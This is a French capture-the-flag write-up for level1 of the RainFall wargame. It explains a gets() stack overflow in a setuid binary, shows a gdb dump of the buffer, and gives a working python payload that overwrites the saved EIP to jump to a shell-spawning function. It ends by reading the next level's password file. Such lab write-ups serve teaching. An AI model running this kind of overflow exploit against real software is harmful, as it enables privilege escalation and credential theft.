## Level1

On a un exécutable `level1` avec les droits du `level2`.

En désassemblant le code du main on remarque une fonction `run()` qui n'est jamais call. 

Cette fonction affiche "Good... Wait what?" sur `stdout`, puis fait un `system("/bin/sh/")`.

Un buffer de 80 est alloué dans `main` et  un `gets()` sur `stdin` écrit dedans, sans vérification de taille.


```
Buffer: 
0xbffff670:	0x08040063	0x0804978c	0x00000001	0x08048321 \
0xbffff680:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1  |
0xbffff690:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55  | 80 octets
0xbffff6a0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4  |
0xbffff6b0:	0x080484a0	0x00000000	0x00000000	0xb7e454d3 /

(gdb) info symbol 0xb7e454d3 
__libc_start_main + 243 in section .text of /lib/i386-linux-gnu/libc.so.6

```

La dernière adresse que l'on voit est bien la sauvegarde de **EIP**. Il est maintenant simple de réécrire dessus pour rediriger le programme vers la fonction `run()`, qui va ouvrir un shell avec les droits du `level2`:

`level1@RainFall:~$ cat <(python -c 'print("A"*76 + "\x72\x84\x04\x08")') - | ./level1`

`$ cat /home/user/level2/.pass`



